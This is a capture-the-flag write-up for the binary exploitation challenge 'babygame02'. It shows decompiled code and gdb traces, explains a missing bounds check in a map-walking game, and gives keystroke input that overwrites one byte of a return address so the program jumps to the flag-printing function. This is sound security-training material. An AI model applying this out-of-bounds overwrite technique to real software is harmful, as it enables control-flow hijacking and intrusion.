# Writeup - babygame02
Category: Binary Exploitation, Points: 200


## Descpriton

> Break the game and get the flag.

A binary file is shared after launching the challenge instance.


## Vulnerability

When opened up in Ghidra, this is the `main` function:
```C
void main(void)
{
  int user_input;
  int player [2];
  char map [2700];
  char position;
  undefined *control;
  
  control = &stack0x00000004;
  init_player(player);
  init_map(map,player);
  print_map(map,player);
  signal(2,sigint_handler);
  do {
    do {
      user_input = getchar();
      position = (char)user_input;
      move_player(player,position,map);
      print_map(map,player);
    } while (player[0] != 29);
  } while (player[1] != 89);
  puts("You win!");
  return;
}
```

As you can see it initializes a `map` of 2700 characters. And as long as `player` hasn't reached the end of the `map`. We call the `move_player` function.

This is the `move_player` function:
```C
void move_player(int *player,char user_input,char *map)

{
  int player_char;
  
  if (user_input == 'l') {
    player_char = getchar();
    player_tile = (char)player_char;
  }
  if (user_input == 'p') {
    solve_round(map,player);
  }
  map[player[1] + *player * 90] = '.';
  if (user_input == 'w') {
    *player = *player + -1;
  }
  else if (user_input == 's') {
    *player = *player + 1;
  }
  else if (user_input == 'a') {
    player[1] = player[1] + -1;
  }
  else if (user_input == 'd') {
    player[1] = player[1] + 1;
  }
  map[player[1] + *player * 90] = player_tile;
  return;
}
```

As you see the `move_player` function, moves the player to a position based on `user_input`.  `w` moves up. `a` moves left. `s` moves down. And `d` moves right. `p` moves to the end of `map`. And with `l` we can change the character that represents `player`. 

And, this is the `win` function:
```C
void win(void)

{
  char banner [60];
  FILE *flag;
  
  flag = fopen("flag.txt","r");
  if (flag == (FILE *)0x0) {
    puts("flag.txt not found in current directory");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  fgets(banner,60,flag);
  printf(banner);
  return;
}
```

As you can see the `win` function prints the flag. 

Notice that neither the `move_player` function nor the `main` function do any sort of bounds check.

The vulnerability is in the fact that we can go *outside* the map. Which means we can overwrite stuff on the stack. Also the `move_player` function allows us to write a byte with `l`. So this means we can overwrite exactly a byte on to the stack.

The idea is to change a byte in an address on the stack, so that we can call the `win` fucntion. Programatically something like this `stack[address] = win function's address`. Where `stack[address]` idiomatically represents the value of stack in address.

For that, we need to know. The address of `win`. And the address of `map`. Why `map`? Because the start of the `map` is the offset point for writing to the stack.

If we `gdb` the binary:
```console
gef➤  info functions 
All defined functions:

Non-debugging symbols:
0x08049000  _init
0x08049040  __libc_start_main@plt
0x08049050  printf@plt
0x08049060  fflush@plt
0x08049070  getchar@plt
0x08049080  fgets@plt
0x08049090  signal@plt
0x080490a0  sleep@plt
0x080490b0  puts@plt
0x080490c0  exit@plt
0x080490d0  fopen@plt
0x080490e0  putchar@plt
0x080490f0  _start
0x08049130  _dl_relocate_static_pie
0x08049140  __x86.get_pc_thunk.bx
0x08049150  deregister_tm_clones
0x08049190  register_tm_clones
0x080491d0  __do_global_dtors_aux
0x08049200  frame_dummy
0x08049206  sigint_handler
0x08049223  init_map
0x080492c9  find_player_pos
0x0804933f  find_end_tile_pos
0x080493af  print_map
0x08049451  init_player
0x08049474  move_player
0x08049549  clear_screen
0x08049587  solve_round
0x08049674  main
0x0804975d  win
0x080497e0  __x86.get_pc_thunk.ax
0x080497e4  _fini
gef➤  
```

We now know the address of `win`.

We need to know *where* to write the `win` functions address. For that, first we need the address of `map`.

For that, we need to see what happens with the registers when `l` is pressed. Why? Because that is when `move_player` is called. Which means that there is a `return` instruction to `main` at some address. If we overwrite this address to `win`. *We will be running instrucions from `win` onwards*. Which will print the flag. 

We set a breakpoint to when `l` is pressed: 
```console
Breakpoint 1, 0x0804953f in move_player ()

[ Legend: Modified register | Code | Heap | Stack | String ]
─────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0xffffc57f  →  "..................................................[...]"
$ebx   : 0xffffc413  →  "..................................................[...]"
$ecx   : 0x4       
$edx   : 0x60      
$esp   : 0xffffc3d0  →  0x080482cc  →  0x00000035 ("5"?)
$ebp   : 0xffffc3e8  →  0xffffcea8  →  0xf7ffd020  →  0xf7ffda40  →  0x00000000
$esi   : 0x4       
$edi   : 0xf7ffcb80  →  0x00000000
$eip   : 0x0804953f  →  <move_player+203> mov BYTE PTR [eax], dl
$eflags: [zero carry parity adjust SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 
─────────────────────────────────────────────────────────────────────────────────── stack
0xffffc3d0│+0x0000: 0x080482cc  →  0x00000035 ("5"?)	 ← $esp
0xffffc3d4│+0x0004: 0x0804c000  →  0x0804bf10  →  <_DYNAMIC+0> add DWORD PTR [eax], eax
0xffffc3d8│+0x0008: 0xffffcf74  →  0xffffd13d  →  "/home/aszels/code/ctf/babygame02/game"
0xffffc3dc│+0x000c: 0xf7ffcb6c  →  0x00000000
0xffffc3e0│+0x0010: 0x0804c000  →  0x0804bf10  →  <_DYNAMIC+0> add DWORD PTR [eax], eax
0xffffc3e4│+0x0014: 0xffffcf74  →  0xffffd13d  →  "/home/aszels/code/ctf/babygame02/game"
0xffffc3e8│+0x0018: 0xffffcea8  →  0xf7ffd020  →  0xf7ffda40  →  0x00000000	 ← $ebp
0xffffc3ec│+0x001c: 0x08049709  →  <main+149> add esp, 0x10
───────────────────────────────────────────────────────────────────────────── code:x86:32
    0x8049538 <move_player+196> imul   eax, ecx, 0x5a
    0x804953b <move_player+199> add    eax, ebx
    0x804953d <move_player+201> add    eax, esi
 →  0x804953f <move_player+203> mov    BYTE PTR [eax], dl
    0x8049541 <move_player+205> nop    
    0x8049542 <move_player+206> lea    esp, [ebp-0x8]
    0x8049545 <move_player+209> pop    ebx
    0x8049546 <move_player+210> pop    esi
    0x8049547 <move_player+211> pop    ebp
───────────────────────────────────────────────────────────────────────────────── threads
[#0] Id 1, Name: "game", stopped 0x804953f in move_player (), reason: BREAKPOINT
─────────────────────────────────────────────────────────────────────────────────── trace
[#0] 0x804953f → move_player()
[#1] 0x8049709 → main()
```

Here `ebx` is pointing to `0xffffc413` - the address of `map`.

Now *where* in the stack do we overwrite?

If you notice the `stack` section the value address `0xffffc3ec` is `0x08049709`. The return address to `main`. This we where we overwrite.

Let's compare `win`s address `0x0804975d`. And `main`s return address `0x08049709`. There is exactly a byte's difference. If we change `09` to `5d` we `win`.

How do we write on `0xffffc3ec`? Well we know the address of `map`. Which is what `ebx` is pointing to. To get the offset from the start of `map`, we need to `p/d 0xffffc413-0xffffc3ec`. Which gives us `39` in decimal.

So if we move `39` bytes to the left from the start of `map`. We should we able to overwrite on `0xffffc3ec`. Programatically `map[-39] = 0x5d`. 


## Exploit

I tried moving `39` bytes to the left from the start of the map. But it gives a segfault. Which means we have to find a way to bypass this.

I noticed that if we press `w` we can go over the `map`. Also I pressed `a` from there and it didn't give a segfault.

Hence, the idea is to press `w` and go `39` bytes to the left. Then press `s`. This would translate to
```console
map[0] = '@'; //we go to the start of the map
map[-89] = '@'; //we press `w`
map[-128] = '@'; //we press `a` 39 times 39+89 = 128
map[-128] = ']'; // `]` is `0x5d` in ASCII
map[-39] = ']'; //we press `s`
```

This is the exploit line-by-line:
```console
aaaa
wwwww
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
l]
s
```

This would call `win`. Which should get the flag. But there is a catch. `]` doesn't work on the remote instance. To get around this. We need to notice the assembly for `win`.
```console
Dump of assembler code for function win:
   0x0804975d <+0>:	push   ebp
   0x0804975e <+1>:	mov    ebp,esp
   0x08049760 <+3>:	push   ebx
   0x08049761 <+4>:	sub    esp,0x44
   0x08049764 <+7>:	call   0x8049140 <__x86.get_pc_thunk.bx>
   0x08049769 <+12>:	add    ebx,0x2897
   0x0804976f <+18>:	nop
   0x08049770 <+19>:	nop
   0x08049771 <+20>:	nop
   0x08049772 <+21>:	nop
   0x08049773 <+22>:	nop
   0x08049774 <+23>:	nop
   0x08049775 <+24>:	nop
   0x08049776 <+25>:	nop
   0x08049777 <+26>:	nop
   0x08049778 <+27>:	nop
...
```

With the `nop`s. We can replace the return address with any one of the `nop` address. `0x70` is `p`.

With `]` replaced by `p`.
```console
aaaa
wwwww
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
lp
s
```

This will get you the flag.


## References
<https://blog.ry4n.org/babygame02-picoctf-writeup-6bf57b54f7b3>

